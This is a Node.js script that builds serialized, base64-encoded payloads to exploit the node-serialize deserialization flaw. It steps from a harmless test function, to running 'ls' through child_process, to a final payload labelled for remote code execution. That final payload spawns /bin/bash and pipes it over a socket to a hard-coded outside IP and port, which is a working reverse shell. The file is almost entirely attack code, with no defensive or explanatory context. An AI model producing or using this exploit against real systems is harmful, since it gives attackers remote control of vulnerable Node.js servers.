var serialize = require('node-serialize');

// Initial payload with function as a property
var payload = {
	payload : function(){
		console.log("TEST");
	}
};
var serializedPayload = serialize.serialize(payload);
console.log("Serialized: \n" + serializedPayload + "\n");
var encodedPayload = new Buffer(serializedPayload).toString('base64');	
console.log("Encoded: \n" + encodedPayload +"\n");

// Second payload with process execution in the function property
var payloadListData = {
	payload : function(){
		require('child_process').exec('ls', function(error, stdout, stderr) {
			console.log(stdout)
		});
	}
};
var serializedPayload = serialize.serialize(payloadListData);
console.log("Serialized: \n" + serializedPayload + "\n");
var encodedPayload = new Buffer(serializedPayload).toString('base64');	
console.log("Encoded: \n" + encodedPayload +"\n");

// Final payload for RCE
var payloadNCConnection = {
payload : (function(){
	var HOST = "35.225.130.53";
	var PORT = 1337;
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/bash", []);
    var client = new net.Socket();
    client.connect(PORT, HOST, function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application form crashing
})
};

var serializedPayload = serialize.serialize(payloadNCConnection);
console.log("Serialized: \n" + serializedPayload + "\n");
var encodedPayload = new Buffer(serializedPayload).toString('base64');	
console.log("Encoded: \n" + encodedPayload +"\n");